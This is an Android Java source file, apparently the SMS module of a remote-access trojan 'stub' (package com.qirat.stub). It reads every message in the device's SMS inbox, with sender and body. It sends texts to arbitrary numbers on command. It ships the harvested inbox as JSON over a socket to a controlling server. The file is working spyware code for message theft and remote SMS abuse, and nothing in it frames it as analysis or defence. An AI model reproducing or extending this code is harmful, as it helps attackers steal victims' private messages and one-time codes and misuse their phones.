package com.qirat.stub;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.telephony.SmsManager;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class SMSManager {

    private static final String TAG = "SMSManager";

    public static JSONObject getSMSList(Context context) {
        JSONObject smsListJSON = new JSONObject();
        JSONArray list = new JSONArray();
        Cursor cur = null;
        try {
            Uri uriSMSURI = Uri.parse("content://sms/inbox");
            cur = context.getContentResolver().query(uriSMSURI, null, null, null, null);

            if (cur == null) {
                Log.e(TAG, "Cursor is null.");
                return null;
            }

            while (cur.moveToNext()) {
                JSONObject sms = new JSONObject();
                String address = cur.getString(cur.getColumnIndexOrThrow("address"));
                String body = cur.getString(cur.getColumnIndexOrThrow("body"));
                sms.put("phoneNo", address);
                sms.put("msg", body);
                list.put(sms);
            }
            smsListJSON.put("smsList", list);
            Log.d(TAG, "SMS list collection complete.");
            return smsListJSON;
        } catch (JSONException | IllegalArgumentException e) {
            Log.e(TAG, "Error getting SMS list", e);
        } finally {
            if (cur != null) {
                cur.close();
            }
        }
        return null;
    }

    public static boolean sendSMS(String phoneNo, String msg) {
        try {
            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage(phoneNo, null, msg, null, null);
            return true;
        } catch (Exception ex) {
            Log.e(TAG, "Error sending SMS", ex);
            return false;
        }
    }


    public static void sendSMSListToServer(Context context) {
        new Thread(() -> {
            JSONObject smsList = getSMSList(context);
            if (smsList == null) {
                Log.e(TAG, "Cannot send SMS list, the collected list is null.");
                return;
            }


            Socket socket = Socket.getInstance(context);
            if (socket.isConnected()) {
                Log.d(TAG, "Sending SMS list to server...");
                socket.sendData("SMS_LIST:" + smsList.toString());
            } else {
                Log.e(TAG, "Cannot send SMS list, socket not connected.");
            }
        }).start();
    }
}
